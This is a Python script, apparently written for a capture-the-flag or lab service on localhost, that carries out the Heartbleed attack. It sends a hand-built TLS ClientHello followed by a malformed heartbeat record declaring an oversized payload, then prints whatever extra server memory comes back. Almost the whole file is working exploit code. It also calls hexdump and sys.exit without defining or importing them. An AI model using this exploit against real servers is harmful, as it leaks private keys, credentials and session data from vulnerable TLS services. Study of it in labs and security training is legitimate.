import socket
import ssl
import time
import codecs
import struct
import select
hb = bytes.fromhex('''
    18 03 02 00 03
    01 40 00
    ''')
hello = bytes.fromhex('''
	16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01                                  
        ''')
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                                return None
            rdata += data
            remain -= len(data)
    return rdata
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print( 'Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print( 'Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print( ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay
def hit_hb(s):
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print( 'No heartbeat response received, server likely not vulnerable')
            return False
        if typ == 24:
            print( 'Received heartbeat response:')
            if len(pay) > 3:
                print( 'WARNING: server returned more data than it should - server is vulnerable!')
                print(f'payload:\n{pay}')
            else:
                print( 'Server processed malformed heartbeat, but did not return any extra data.')
            return True
        if typ == 21:
            print( 'Received alert:')
            hexdump(pay)
            print( 'Server returned error, likely not vulnerable')
            return False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 9876))
sock.recv(1024)
sock.send(b'4\n')
sock.send(hello)
while True:
    typ, ver, pay = recvmsg(sock)
    if typ == None:
        print('server closed connection w/o hello')
        sys.exit()
    if typ == 22 and pay[0] == 0x0E:
        break
print('sending hb...')
sock.send(hb)
hit_hb(sock)
